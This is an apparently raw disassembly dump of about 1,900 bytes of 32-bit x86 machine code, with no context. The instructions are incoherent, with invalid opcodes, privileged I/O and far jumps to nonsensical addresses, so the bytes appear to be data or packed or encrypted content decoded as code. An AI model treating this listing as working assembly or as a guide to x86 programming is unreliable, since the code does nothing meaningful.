  40a242:	push   0x8c1b31a2
  40a247:	mov    ah,0xc7
  40a249:	dec    esi
  40a24a:	xchg   edi,eax
  40a24b:	jecxz  0x40a1e2
  40a24d:	and    eax,0x44c8afc7
  40a252:	fld    QWORD PTR [edx+0x25d9c489]
  40a258:	jno    0x40a287
  40a25a:	aaa    
  40a25b:	mov    fs,WORD PTR [ebp-0x2efa1915]
  40a261:	ja     0x40a2c7
  40a263:	clc    
  40a264:	inc    ebx
  40a265:	jecxz  0x40a2a4
  40a267:	iret   
  40a268:	inc    edi
  40a269:	sub    eax,0x75c0a6d
  40a26e:	sub    DWORD PTR [ebp-0x5e],edi
  40a271:	mov    bh,0xd6
  40a273:	cld    
  40a274:	jecxz  0x40a2e8
  40a276:	dec    edx
  40a277:	add    eax,0x53021719
  40a27c:	pop    edi
  40a27d:	xchg   esp,eax
  40a27e:	test   BYTE PTR [ebp-0x63],cl
  40a281:	test   BYTE PTR [eax-0x3f976e1c],ah
  40a287:	and    esp,DWORD PTR [ebx+0x2a]
  40a28a:	push   ebx
  40a28b:	pop    es
  40a28c:	mov    esi,0x37a4f649
  40a291:	enter  0x16a1,0x82
  40a295:	nop
  40a296:	push   es
  40a297:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a298:	gs es aad 0x20
  40a29c:	dec    ecx
  40a29d:	xchg   esp,eax
  40a29e:	ins    DWORD PTR es:[edi],dx
  40a29f:	mov    ebp,0x1320c07e
  40a2a4:	rcl    dl,1
  40a2a6:	mov    edx,DWORD PTR [ebx+0x5773769d]
  40a2ac:	gs push ecx
  40a2ae:	xlat   BYTE PTR ds:[ebx]
  40a2af:	(bad)  
  40a2b1:	fdivp  st(2),st
  40a2b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a2b4:	sub    eax,0x2f52be78
  40a2b9:	shr    bl,1
  40a2bb:	clc    
  40a2bc:	xor    DWORD PTR [eax+0x3a],eax
  40a2bf:	xor    ebx,DWORD PTR [edi+ebp*1+0x48]
  40a2c3:	das    
  40a2c4:	inc    edx
  40a2c5:	retf   
  40a2c6:	jmp    0xaaa7:0x25f7b6e3
  40a2cd:	mov    dh,0x7
  40a2cf:	inc    edx
  40a2d0:	cmp    al,0x66
  40a2d2:	inc    ebp
  40a2d3:	xlat   BYTE PTR ds:[ebx]
  40a2d4:	inc    edi
  40a2d5:	push   ss
  40a2d6:	fist   DWORD PTR [eax-0x63]
  40a2d9:	popa   
  40a2da:	inc    esi
  40a2db:	repz or ebx,DWORD PTR [edx]
  40a2de:	call   0x170b6418
  40a2e3:	imul   edx,DWORD PTR [edi],0xec272bfc
  40a2e9:	neg    BYTE PTR [ebp-0x1c9f4df]
  40a2ef:	sub    eax,0x8f63650e
  40a2f4:	out    dx,al
  40a2f5:	add    cl,ah
  40a2f7:	xor    al,0x47
  40a2f9:	push   esp
  40a2fa:	inc    ebp
  40a2fb:	imul   esp,DWORD PTR [edi],0x935a0d6e
  40a301:	and    edi,DWORD PTR [ecx+0x51471cf8]
  40a307:	sti    
  40a308:	(bad)  
  40a309:	cmc    
  40a30a:	or     ah,BYTE PTR [ecx-0x1fe54001]
  40a310:	jns    0x40a2af
  40a312:	xor    DWORD PTR [ebx-0x76],esi
  40a315:	hlt    
  40a316:	push   edi
  40a317:	jle    0x40a30c
  40a319:	xor    DWORD PTR [esi],ebp
  40a31b:	add    DWORD PTR [ecx],0x5c
  40a31e:	fld    DWORD PTR [ebp-0x49]
  40a321:	femms  
  40a323:	sub    DWORD PTR [edx],edi
  40a325:	iret   
  40a326:	fsub   DWORD PTR [eax+0x38bb24aa]
  40a32c:	jne    0x40a3a4
  40a32e:	sar    ch,cl
  40a330:	mov    ch,0xd3
  40a332:	push   ecx
  40a333:	pop    esp
  40a334:	or     ch,BYTE PTR [ebp+ecx*1-0x59]
  40a338:	add    dh,BYTE PTR [ecx]
  40a33a:	dec    ebx
  40a33b:	lods   eax,DWORD PTR ds:[esi]
  40a33c:	push   cs
  40a33d:	pop    ss
  40a33e:	jno    0x40a32d
  40a340:	or     DWORD PTR [esi-0xca9fe],ecx
  40a346:	retf   
  40a347:	inc    ebp
  40a348:	xchg   esi,eax
  40a349:	mov    al,ds:0xf82846d8
  40a34e:	mov    es,WORD PTR [esp+ebp*2]
  40a351:	imul   ebx,DWORD PTR [ebp+0x4d9cf22c],0x115388ae
  40a35b:	inc    esi
  40a35c:	je     0x40a351
  40a35e:	xchg   DWORD PTR [eax+ebp*4],eax
  40a361:	daa    
  40a362:	mov    DWORD PTR [edx+0x7e],eax
  40a365:	inc    ebx
  40a366:	xor    esp,DWORD PTR [ebp+0x60]
  40a369:	sbb    cl,bl
  40a36b:	sub    DWORD PTR [ecx-0x2813b5e1],eax
  40a371:	in     eax,0xa4
  40a373:	retf   0xc0fc
  40a376:	sbb    ah,BYTE PTR [esi+0x42]
  40a379:	fsubr  DWORD PTR [eax-0x57dda670]
  40a37f:	std    
  40a380:	pop    ecx
  40a381:	add    al,0x25
  40a383:	add    eax,0x2ff5dd99
  40a388:	cs lahf 
  40a38a:	scas   al,BYTE PTR es:[edi]
  40a38b:	mov    bl,0x6d
  40a38d:	dec    ebp
  40a38e:	loop   0x40a3c8
  40a390:	stos   BYTE PTR es:[edi],al
  40a391:	or     eax,0xab6b428b
  40a396:	add    BYTE PTR [eax+ebx*8-0x6b9ba2fe],bh
  40a39d:	pop    ss
  40a39e:	mov    edi,0xbcb142b
  40a3a3:	popa   
  40a3a4:	popf   
  40a3a5:	or     bl,BYTE PTR [edx+0x46]
  40a3a8:	mov    al,ds:0x6bffee52
  40a3ad:	mov    ebx,0x1b6ce89c
  40a3b2:	inc    DWORD PTR [ecx]
  40a3b4:	mov    ecx,0x97d2d958
  40a3b9:	int    0x83
  40a3bb:	loope  0x40a430
  40a3bd:	pusha  
  40a3be:	cmp    edi,DWORD PTR [eax+edi*8-0x4cd3f50e]
  40a3c5:	leave  
  40a3c6:	cmp    bl,BYTE PTR [edx+0x5f]
  40a3c9:	pop    ebx
  40a3ca:	clc    
  40a3cb:	stc    
  40a3cc:	xor    BYTE PTR [ecx+edx*4],0x97
  40a3d0:	aam    0xf1
  40a3d2:	vpaddd ymm4,ymm0,YMMWORD PTR [esi]
  40a3d6:	inc    ebx
  40a3d7:	pop    ds
  40a3d8:	js     0x40a371
  40a3da:	jle    0x40a44d
  40a3dc:	imul   ebx,DWORD PTR [ebx-0x4204b2c8],0x87f01b77
  40a3e6:	popa   
  40a3e7:	ficom  DWORD PTR [ecx+edx*1+0x26]
  40a3eb:	test   edx,ebp
  40a3ed:	xor    al,0x82
  40a3ef:	lds    ebx,FWORD PTR [edi-0x6ac9d193]
  40a3f5:	imul   dh
  40a3f7:	jmp    0x40a39f
  40a3f9:	fld    QWORD PTR [ecx+0x509f24a5]
  40a3ff:	mov    bl,0x61
  40a401:	mov    ebx,ebp
  40a403:	mov    ebx,0x2629ee15
  40a408:	mov    BYTE PTR [esi+0x50655cc8],ah
  40a40e:	dec    ecx
  40a40f:	cmp    eax,0x44312e1e
  40a414:	idiv   DWORD PTR [ecx]
  40a416:	cmp    edi,DWORD PTR [eax+0x26]
  40a419:	push   ss
  40a41a:	jmp    0xa06:0x8724a7aa
  40a421:	lods   al,BYTE PTR ds:[esi]
  40a422:	icebp  
  40a423:	xchg   esi,eax
  40a424:	mov    ebp,0xaed6a0b1
  40a429:	stos   DWORD PTR es:[edi],eax
  40a42a:	jno    0x40a47c
  40a42c:	pop    edi
  40a42d:	xchg   edi,eax
  40a42e:	add    al,0x57
  40a430:	lods   eax,DWORD PTR ds:[esi]
  40a431:	fdivp  st(2),st
  40a433:	add    bl,BYTE PTR [ecx+0x2b]
  40a436:	imul   esi,esi,0x56
  40a439:	iret   
  40a43a:	pop    ss
  40a43b:	lock icebp 
  40a43d:	adc    eax,0x17275446
  40a442:	data16 idiv BYTE PTR [ebx]
  40a445:	sbb    DWORD PTR [ebp-0x5c4f5172],esi
  40a44b:	sbb    ah,BYTE PTR [eax]
  40a44d:	test   BYTE PTR [eax-0x77f47b69],0xbb
  40a454:	loopne 0x40a40a
  40a456:	les    esp,FWORD PTR [edi-0x1a]
  40a459:	out    0xa,eax
  40a45b:	icebp  
  40a45c:	pusha  
  40a45d:	into   
  40a45e:	xchg   edx,eax
  40a45f:	test   DWORD PTR [ebx-0x7f302ded],edi
  40a465:	mov    ds:0x43749441,al
  40a46a:	lods   eax,DWORD PTR ds:[esi]
  40a46b:	dec    edx
  40a46c:	rol    BYTE PTR [ebp+edi*8-0x3b83d68d],0xfa
  40a474:	ins    DWORD PTR es:[edi],dx
  40a475:	sbb    ch,dh
  40a477:	xor    BYTE PTR [ebx-0x49],bh
  40a47a:	sub    edx,DWORD PTR [ecx-0x37]
  40a47d:	into   
  40a47e:	loop   0x40a4ba
  40a480:	(bad)  
  40a481:	mov    ebp,0x5d5ec096
  40a486:	or     BYTE PTR [ebx+0x19],ch
  40a489:	je     0x40a4ee
  40a48b:	and    eax,0xf56dff2b
  40a490:	ins    DWORD PTR es:[edi],dx
  40a491:	ins    DWORD PTR es:[edi],dx
  40a492:	fcmovne st,st(7)
  40a494:	pop    ebp
  40a495:	scas   eax,DWORD PTR es:[edi]
  40a496:	xor    cl,cl
  40a498:	rcr    DWORD PTR [ebp-0x6c],0x1f
  40a49c:	or     cl,ch
  40a49e:	adc    ch,bh
  40a4a0:	jmp    0x92c2:0xcdcdcad8
  40a4a7:	fist   DWORD PTR [ebx+edi*4+0x7e4d0b04]
  40a4ae:	popf   
  40a4af:	fmul   DWORD PTR [esi+0x72be9edd]
  40a4b5:	xchg   esp,eax
  40a4b6:	fild   DWORD PTR [ebp+0x58a86c4]
  40a4bc:	mov    eax,ds:0x59fcde2a
  40a4c1:	pop    edx
  40a4c2:	inc    eax
  40a4c3:	popa   
  40a4c4:	push   esp
  40a4c5:	outs   dx,DWORD PTR ds:[esi]
  40a4c6:	fsub   DWORD PTR [ecx+esi*1-0x1a8fa92c]
  40a4cd:	jmp    0xd8544222
  40a4d2:	mov    ds:0x4a06db1f,eax
  40a4d7:	mov    fs,edx
  40a4d9:	adc    al,BYTE PTR [ebp+0x41]
  40a4dc:	(bad)  
  40a4dd:	pop    edx
  40a4de:	test   al,0x59
  40a4e0:	rol    BYTE PTR [ebx+0x5beba0a8],cl
  40a4e6:	mov    WORD PTR [ebp-0x45],cs
  40a4e9:	sbb    ecx,edx
  40a4eb:	out    0x7d,al
  40a4ed:	stos   DWORD PTR es:[edi],eax
  40a4ee:	repnz gs add al,0x2f
  40a4f2:	cmp    DWORD PTR [esi-0x237a04c5],esp
  40a4f8:	mov    ecx,0x3efc8927
  40a4fd:	lock int3 
  40a4ff:	add    al,0x24
  40a501:	pop    ss
  40a502:	dec    esi
  40a503:	les    edi,FWORD PTR [ecx+0x6]
  40a506:	cwde   
  40a507:	sti    
  40a508:	mov    ecx,0xcf760eed
  40a50d:	and    cl,BYTE PTR [ebx+0x55]
  40a510:	dec    ecx
  40a511:	mov    ecx,0xfe68b6a9
  40a516:	cmp    bh,dh
  40a518:	jns    0x40a56d
  40a51a:	retf   0xfac
  40a51d:	cmp    dl,BYTE PTR [ebp-0x4acbf8d7]
  40a523:	jo     0x40a552
  40a525:	pop    ss
  40a526:	ret    0x271b
  40a529:	clc    
  40a52a:	mov    eax,ds:0x1f0b963f
  40a52f:	sub    eax,0xf8b5178e
  40a534:	clc    
  40a535:	xchg   esp,eax
  40a536:	push   ecx
  40a537:	add    BYTE PTR [eax+0x4dd70464],dh
  40a53d:	jae    0x40a54f
  40a53f:	nop
  40a540:	out    dx,eax
  40a541:	and    DWORD PTR [esi-0x7b061d28],esp
  40a547:	pushf  
  40a548:	or     esp,DWORD PTR [ebx-0x25]
  40a54b:	adc    eax,0x3aa28bf8
  40a550:	jl     0x40a511
  40a552:	aaa    
  40a553:	or     al,0x32
  40a555:	push   ecx
  40a556:	shl    DWORD PTR [eax-0x3d911498],1
  40a55c:	adc    dh,bh
  40a55e:	pop    esi
  40a55f:	and    bh,BYTE PTR [edi]
  40a561:	int    0xd2
  40a563:	aad    0x18
  40a565:	add    al,0x43
  40a567:	jno    0x40a511
  40a569:	sbb    ecx,eax
  40a56b:	jmp    0x4180:0x919018ee
  40a572:	stos   DWORD PTR es:[edi],eax
  40a573:	xchg   ebx,eax
  40a574:	and    eax,0x5dd85147
  40a579:	xchg   BYTE PTR [eax+0x231faf13],ah
  40a57f:	mov    BYTE PTR [esi-0x73],al
  40a582:	or     BYTE PTR [edx-0x39],ah
  40a585:	jbe    0x40a5cf
  40a587:	and    BYTE PTR [edi-0xf2cee9d],0x9a
  40a58e:	mov    cl,0x62
  40a590:	gs mov eax,0xfb4145e3
  40a596:	je     0x40a531
  40a598:	sahf   
  40a599:	xchg   ebx,eax
  40a59a:	fcom   QWORD PTR [edi+ebp*2+0x752e2009]
  40a5a1:	cmp    eax,0x57f40d23
  40a5a6:	xlat   BYTE PTR ds:[ebx]
  40a5a7:	cmp    eax,0x9322c9e2
  40a5ac:	das    
  40a5ad:	repnz inc ebx
  40a5af:	ds cwd 
  40a5b2:	popf   
  40a5b3:	jp     0x40a57e
  40a5b5:	or     DWORD PTR [edi+0x7aa1e6b7],0x73
  40a5bc:	out    0x7e,al
  40a5be:	cwde   
  40a5bf:	in     eax,dx
  40a5c0:	push   eax
  40a5c1:	cs pop eax
  40a5c3:	dec    esp
  40a5c4:	addr16 popf 
  40a5c6:	and    BYTE PTR [bx+di-0x2a41],cl
  40a5cb:	dec    esp
  40a5cc:	test   BYTE PTR [esi+0x3],bh
  40a5cf:	popa   
  40a5d0:	mov    edx,0x9e9820e6
  40a5d5:	addr16 sbb bl,cl
  40a5d8:	out    dx,al
  40a5d9:	jne    0x40a5e6
  40a5db:	mov    ds:0xce266a2b,eax
  40a5e0:	in     eax,0x4e
  40a5e2:	adc    DWORD PTR [eax+eiz*1+0x7958d6f0],esp
  40a5e9:	(bad)  
  40a5ea:	iret   
  40a5eb:	adc    bl,BYTE PTR [esp+edx*8+0x2e7f6ec7]
  40a5f2:	fimul  DWORD PTR [esi+0xe]
  40a5f6:	cs out dx,eax
  40a5f8:	push   esi
  40a5f9:	cs jb  0x40a61b
  40a5fc:	mov    ds:0xe62a1e3d,eax
  40a601:	and    esp,ebp
  40a603:	imul   DWORD PTR [ebp+ebx*8-0x27]
  40a607:	sbb    al,0xff
  40a609:	addr16 pop ebp
  40a60b:	xchg   ebx,eax
  40a60c:	mov    ah,0xcd
  40a60e:	fcomp  DWORD PTR [esp+eax*1-0x76288194]
  40a615:	aas    
  40a616:	bnd jo 0x40a5ba
  40a619:	outs   dx,DWORD PTR ds:[esi]
  40a61a:	cmp    ebx,DWORD PTR [ecx-0x4dac4a2b]
  40a620:	adc    eax,0xcaa04aea
  40a625:	out    dx,eax
  40a626:	xchg   esi,eax
  40a627:	push   0xf30d4199
  40a62c:	xor    al,0x7b
  40a62e:	xchg   ecx,eax
  40a62f:	cdq    
  40a630:	sti    
  40a631:	les    esp,FWORD PTR [ebp+0x19a9ec95]
  40a637:	pop    ds
  40a638:	xchg   DWORD PTR [eax+0x65cdc4b8],esp
  40a63e:	sub    BYTE PTR [eax+0x33f63130],al
  40a644:	cli    
  40a645:	adc    BYTE PTR [ecx],cl
  40a647:	push   esp
  40a648:	push   DWORD PTR [edi-0x2d]
  40a64b:	mov    dh,0xf0
  40a64d:	push   0x6717d914
  40a652:	mov    bh,0x69
  40a654:	mov    edx,0x21f33c57
  40a659:	dec    esp
  40a65a:	in     eax,0xe9
  40a65c:	push   edi
  40a65d:	jae    0x40a659
  40a65f:	dec    eax
  40a660:	mov    ds:0xc2338479,al
  40a665:	in     al,0x22
  40a667:	cmp    bl,BYTE PTR [ebp-0x10]
  40a66a:	push   esp
  40a66b:	pop    ss
  40a66c:	dec    ecx
  40a66d:	leave  
  40a66e:	fcomp  QWORD PTR [esp+ebx*8+0x12]
  40a672:	cwde   
  40a673:	icebp  
  40a674:	add    ebp,DWORD PTR [ecx+0x50c1e511]
  40a67a:	xchg   edx,eax
  40a67b:	inc    edi
  40a67c:	lods   eax,DWORD PTR ds:[esi]
  40a67d:	pop    edx
  40a67e:	iret   
  40a67f:	loop   0x40a6c1
  40a681:	nop
  40a682:	pop    ecx
  40a683:	jg     0x40a6e6
  40a685:	stc    
  40a686:	dec    esi
  40a687:	gs jp  0x40a69c
  40a68a:	mov    edx,0xf6e48381
  40a68f:	inc    eax
  40a690:	sub    ebp,DWORD PTR fs:[ebx+0x10]
  40a694:	mov    ds:0x1777317a,eax
  40a699:	mov    dl,0x2b
  40a69b:	and    eax,0xb0a687c2
  40a6a0:	sub    eax,0x52fc65f7
  40a6a5:	mov    ah,0x2a
  40a6a7:	imul   edi,esi,0xe0d00fe2
  40a6ad:	pop    esi
  40a6ae:	neg    BYTE PTR [eax]
  40a6b0:	adc    BYTE PTR [ebp+0xa],bl
  40a6b3:	or     edi,DWORD PTR [ebp+edi*4+0x5a]
  40a6b7:	fsubr  QWORD PTR ds:0x3670b28
  40a6bd:	(bad)  
  40a6be:	fidivr WORD PTR [eax]
  40a6c0:	jmp    0x8b0e0c20
  40a6c5:	pop    ss
  40a6c6:	lock (bad) 
  40a6c8:	pop    ecx
  40a6c9:	ja     0x40a67f
  40a6cb:	pop    esp
  40a6cc:	xchg   ecx,ebp
  40a6ce:	in     eax,0xc4
  40a6d0:	mov    WORD PTR [ebx-0x4f],ss
  40a6d3:	sub    eax,0x2597eef1
  40a6d8:	mov    edx,0xf20247f9
  40a6dd:	mov    cl,0x7e
  40a6df:	sti    
  40a6e0:	adc    DWORD PTR [ecx-0x32],eax
  40a6e3:	sbb    BYTE PTR [eax+eiz*4],0xda
  40a6e7:	and    DWORD PTR [si],ebp
  40a6ea:	dec    BYTE PTR [ecx+0x51]
  40a6ed:	or     al,0xfd
  40a6ef:	inc    ecx
  40a6f0:	repnz cmp eax,0x8d3a97d3
  40a6f6:	inc    ebp
  40a6f7:	mov    dh,0xbe
  40a6f9:	push   ebp
  40a6fa:	sbb    cl,cl
  40a6fc:	xor    BYTE PTR [ebp+ebp*4-0xbf64220],bl
  40a703:	push   edi
  40a704:	jbe    0x40a6a8
  40a706:	ror    DWORD PTR ss:[edx-0x68e01ad3],1
  40a70d:	outs   dx,BYTE PTR ds:[esi]
  40a70e:	sub    ch,BYTE PTR [edx]
  40a710:	xor    al,BYTE PTR [ecx+ebx*2]
  40a713:	xor    dh,BYTE PTR [edi]
  40a715:	cmp    edi,esi
  40a717:	xor    eax,0xc6d8ed5e
  40a71c:	xchg   DWORD PTR [esi+esi*1],edi
  40a71f:	mov    edi,0x71c013a7
  40a724:	lahf   
  40a725:	int    0x9b
  40a727:	pop    edi
  40a728:	xchg   DWORD PTR [eax+0x65900d3d],esi
  40a72e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a72f:	dec    esi
  40a730:	cmp    DWORD PTR [ecx*1+0x3c90da28],ebx
  40a737:	ja     0x40a6d0
  40a739:	out    dx,eax
  40a73a:	push   cs
  40a73b:	aad    0xda
  40a73d:	cdq    
  40a73e:	in     al,0x4f
  40a740:	mov    eax,0x29dded9f
  40a745:	xor    BYTE PTR [ebx],ch
  40a747:	lods   eax,DWORD PTR ds:[esi]
  40a748:	int3   
  40a749:	sub    al,0xbc
  40a74b:	jp     0x40a795
  40a74d:	and    cl,dh
  40a74f:	jl     0x40a7cb
  40a751:	add    eax,0x5b52eeb1
  40a756:	dec    ebp
  40a757:	loope  0x40a738
  40a759:	cmp    eax,0xdccf40da
  40a75e:	stos   DWORD PTR es:[edi],eax
  40a75f:	in     eax,0xf3
  40a761:	cld    
  40a762:	pop    eax
  40a763:	ins    DWORD PTR es:[edi],dx
  40a764:	pop    ebp
  40a765:	fadd   DWORD PTR [ebp+0x0]
  40a768:	pop    esi
  40a769:	outs   dx,BYTE PTR ds:[esi]
  40a76a:	arpl   cx,bx
  40a76c:	xchg   edx,eax
  40a76d:	sbb    al,0x3e
  40a76f:	xor    al,ch
  40a771:	cmc    
  40a772:	inc    ebp
  40a773:	cli    
  40a774:	call   0xe44d8035
  40a779:	into   
  40a77a:	jae    0x40a739
  40a77c:	dec    edi
  40a77d:	cli    
  40a77e:	xchg   ecx,eax
  40a77f:	cmp    BYTE PTR ds:0x22e04b99,cl
  40a785:	aas    
  40a786:	and    esp,eax
  40a788:	rcr    ecx,1
  40a78a:	add    BYTE PTR [eax+0x6b7be32f],al
  40a790:	or     al,0xed
  40a792:	repz sbb DWORD PTR ds:0xd7498e0,esi
  40a799:	adc    BYTE PTR [eax-0x24be36fe],al
  40a79f:	jge    0x40a7e7
  40a7a1:	shl    DWORD PTR [edx-0x560ed9cc],1
  40a7a7:	mov    BYTE PTR [edi+ecx*2+0x50],al
  40a7ab:	leave  
  40a7ac:	add    dl,BYTE PTR [ecx-0xc]
  40a7af:	push   ebx
  40a7b0:	fistp  DWORD PTR [edx]
  40a7b2:	inc    esi
  40a7b3:	int    0x37
  40a7b5:	js     0x40a73f
  40a7b7:	jo     0x40a73b
  40a7b9:	stos   DWORD PTR es:[edi],eax
  40a7ba:	sbb    cl,bl
  40a7bc:	pusha  
  40a7bd:	and    bh,al
  40a7bf:	leave  
  40a7c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a7c1:	std    
  40a7c2:	jecxz  0x40a7a1
  40a7c4:	scas   eax,DWORD PTR es:[edi]
  40a7c5:	call   0xc3fef332
  40a7ca:	sub    bh,BYTE PTR [edx+0x5f]
  40a7cd:	mov    WORD PTR [edi],ss
  40a7cf:	call   0x3969:0xee527bae
  40a7d6:	in     eax,dx
  40a7d7:	(bad)  
  40a7d8:	outs   dx,BYTE PTR ds:[esi]
  40a7d9:	shl    eax,cl
  40a7db:	fidiv  WORD PTR [ebx+0x54844247]
  40a7e1:	retf   
  40a7e2:	sub    eax,0xc775f849
  40a7e7:	pop    ebx
  40a7e8:	push   ss
  40a7e9:	scas   eax,DWORD PTR es:[edi]
  40a7ea:	test   BYTE PTR [ebp-0x29],dh
  40a7ed:	jl     0x40a7c6
  40a7ef:	push   ebx
  40a7f0:	jle    0x40a80c
  40a7f2:	cmp    eax,0xa56e23bf
  40a7f7:	clc    
  40a7f8:	je     0x40a796
  40a7fa:	and    BYTE PTR [ebp+0x2d841f1e],bh
  40a800:	dec    edx
  40a801:	loopne 0x40a879
  40a803:	mov    dl,0xec
  40a805:	xchg   BYTE PTR [esi],al
  40a807:	dec    esi
  40a808:	enter  0xdbe0,0xe8
  40a80c:	pop    ebp
  40a80d:	leave  
  40a80e:	cmp    al,0x54
  40a810:	xchg   BYTE PTR [edi+0x5f48b49b],ch
  40a816:	test   BYTE PTR [eax],cl
  40a818:	cmp    DWORD PTR [esi+eax*4],0x2623b8c6
  40a81f:	ins    BYTE PTR es:[edi],dx
  40a820:	pop    ss
  40a821:	push   0xbeb63d68
  40a826:	xchg   esi,eax
  40a827:	out    0x1c,eax
  40a829:	cmp    eax,0x217052d6
  40a82e:	push   ebx
  40a82f:	and    eax,0xa68abea6
  40a834:	aas    
  40a835:	mov    WORD PTR [ebp+0x4567eb2d],ds
  40a83b:	mov    ds:0xc7dae6a9,eax
  40a840:	jmp    0x40a828
  40a842:	mov    dh,0xa0
  40a844:	cli    
  40a845:	inc    eax
  40a846:	push   es
  40a847:	xchg   cl,ah
  40a849:	mov    edx,0x4c2cd75a
  40a84e:	(bad)  
  40a84f:	push   edi
  40a850:	sub    BYTE PTR [ebx],dl
  40a852:	dec    eax
  40a853:	mul    BYTE PTR [ebx]
  40a855:	addr16 inc ebp
  40a857:	les    ecx,FWORD PTR [edi]
  40a859:	mov    eax,ds:0x5d06f2cb
  40a85e:	dec    esp
  40a85f:	lods   al,BYTE PTR ds:[esi]
  40a860:	dec    ebp
  40a861:	pop    esp
  40a862:	xchg   ecx,eax
  40a863:	sub    al,0xf5
  40a865:	dec    ecx
  40a866:	jle    0x40a8ae
  40a868:	adc    DWORD PTR [ebp-0x61cc3961],0x2ab6fb75
  40a872:	add    eax,0x32723e66
  40a877:	inc    ecx
  40a878:	xchg   ecx,eax
  40a879:	(bad)  
  40a87a:	and    al,BYTE PTR [edi+0x60]
  40a87d:	cdq    
  40a87e:	and    DWORD PTR [eax],ebx
  40a880:	(bad)  
  40a881:	scas   eax,DWORD PTR es:[edi]
  40a882:	lds    edi,FWORD PTR [edi+0x54]
  40a885:	jecxz  0x40a899
  40a887:	sub    BYTE PTR [ecx],dl
  40a889:	ret    
  40a88a:	pop    ebp
  40a88b:	add    DWORD PTR [ebp-0x5d639393],edi
  40a891:	retf   0x8797
  40a894:	xchg   BYTE PTR [edx-0x7f],dh
  40a897:	fwait
  40a898:	sti    
  40a899:	pop    esi
  40a89a:	push   ebp
  40a89b:	inc    ecx
  40a89c:	shl    DWORD PTR [ebx-0x1],cl
  40a89f:	dec    edx
  40a8a0:	or     DWORD PTR [ebx],ebp
  40a8a2:	or     DWORD PTR [edx+0x5b9faf5e],ecx
  40a8a8:	jl     0x40a8f3
  40a8aa:	imul   edx,DWORD PTR [ecx],0xc94ba072
  40a8b0:	outs   dx,DWORD PTR ds:[esi]
  40a8b1:	mov    ds:0xaea28488,al
  40a8b6:	mov    cl,0x13
  40a8b8:	out    0x76,al
  40a8ba:	xor    eax,0xae614314
  40a8bf:	aaa    
  40a8c0:	out    dx,eax
  40a8c1:	mov    eax,ds:0x570ab54b
  40a8c6:	fimul  WORD PTR [ebp+0x1bc51288]
  40a8cc:	dec    edx
  40a8cd:	and    BYTE PTR [ebx+0x63],dl
  40a8d0:	dec    ebx
  40a8d1:	mov    ah,0x20
  40a8d3:	ins    DWORD PTR es:[edi],dx
  40a8d4:	(bad)  
  40a8d6:	repz iret 
  40a8d8:	adc    eax,0x16aa4927
  40a8dd:	push   ds
  40a8de:	xlat   BYTE PTR ds:[ebx]
  40a8df:	add    DWORD PTR ds:0xbe7cc1e7,0xffffffd3
  40a8e6:	cmp    BYTE PTR [esi+esi*4-0xaa43571],ah
  40a8ed:	cmp    DWORD PTR [esi+ecx*4+0x3eb8aca],ecx
  40a8f4:	jmp    0x40a8df
  40a8f6:	mov    dh,BYTE PTR [esi+edi*2+0x5c]
  40a8fa:	xchg   ebx,eax
  40a8fb:	cld    
  40a8fc:	adc    al,BYTE PTR [edi]
  40a8fe:	(bad)  
  40a8ff:	(bad)  
  40a901:	mov    DWORD PTR [ebx+0x15],ebx
  40a904:	(bad)  
  40a905:	mov    esi,0x92797bce
  40a90a:	addr16 and al,0x11
  40a90d:	iret   
  40a90e:	shl    edx,1
  40a910:	repnz adc eax,0x6476aadc
  40a916:	cli    
  40a917:	test   eax,0x465946ee
  40a91c:	xchg   al,dl
  40a91e:	enter  0xde99,0x4c
  40a922:	imul   ecx,DWORD PTR [eax],0x9aae3377
  40a928:	xchg   DWORD PTR [edi-0x56a71a6f],edi
  40a92e:	mov    cl,0xc3
  40a930:	repnz sub dh,BYTE PTR [ebp+0x7]
  40a934:	mov    ds:0xae76539,al
  40a939:	or     eax,0x650b5be5
  40a93e:	jo     0x40a904
  40a940:	xchg   edx,eax
  40a941:	lahf   
  40a942:	cmp    DWORD PTR [esi+0x38],ebx
  40a945:	out    0x66,eax
  40a947:	sbb    BYTE PTR [eax-0x4c],dl
  40a94a:	or     BYTE PTR [edx-0x25f6fa9e],dh
  40a950:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a951:	imul   esp
  40a953:	loop   0x40a93e
  40a955:	pop    ss
  40a956:	std    
  40a957:	or     BYTE PTR [ebp-0x50f60eaf],dh
  40a95d:	(bad)  
  40a95e:	sub    eax,0x7cf7102c
  40a963:	out    0x8c,eax
  40a965:	ror    ebx,cl
  40a967:	and    esp,ecx
  40a969:	push   es
  40a96a:	inc    edx
  40a96b:	loop   0x40a960
  40a96d:	and    al,bh
  40a96f:	mov    ah,0x14
  40a971:	repnz adc DWORD PTR [bp+di],eax
  40a975:	dec    ecx
  40a976:	jb     0x40a980
  40a978:	push   eax
  40a979:	sub    al,0xb4
  40a97b:	inc    esi
  40a97c:	pop    es
  40a97d:	test   al,0x1a
  40a97f:	into   
  40a980:	mov    ?,WORD PTR [edi-0x76]
  40a983:	aas    
  40a984:	pusha  
  40a985:	rol    esp,cl
  40a987:	hlt    
  40a988:	pop    es
  40a989:	cmp    al,BYTE PTR [edi-0x4e]
  40a98c:	mov    cl,dh
  40a98e:	retf   
  40a98f:	mov    ds:0x241d9713,eax
  40a994:	pop    edx
  40a995:	jb     0x40a9c3
  40a997:	jno    0x40a96f
  40a999:	lods   al,BYTE PTR ds:[esi]
  40a99a:	mov    ds:0x1f9ee47c,al
  40a99f:	addr16 cld 
  40a9a1:	push   es
  40a9a2:	call   0xa4dc:0xc52369d
  40a9a9:	int    0x15
  40a9ab:	sbb    eax,0xd737fe7c
  40a9b0:	pop    ecx
  40a9b1:	sub    edx,edx
  40a9b3:	pop    edi
  40a9b4:	aas    
  40a9b5:	xchg   DWORD PTR [eax+0x40],ebx
  40a9b8:	sti    
  40a9b9:	mov    al,ds:0xe6cc5fc5
  40a9be:	sbb    eax,0x4be2a4d4
  40a9c3:	daa    
  40a9c4:	rcl    DWORD PTR [ebx+ebp*4],0x4
  40a9c8:	inc    DWORD PTR [edx+eiz*8-0x244a8a89]
  40a9cf:	inc    edi
  40a9d0:	aas    
  40a9d1:	mov    ds:0xfe29a52,al
  40a9d6:	xchg   esp,eax
  40a9d7:	pop    ecx
  40a9d8:	sahf   
  40a9d9:	mov    ebp,0xda7f78c2
  40a9de:	push   ds
  40a9df:	stc    
  40a9e0:	push   ebp
  40a9e1:	outs   dx,BYTE PTR ds:[esi]
  40a9e2:	hlt    
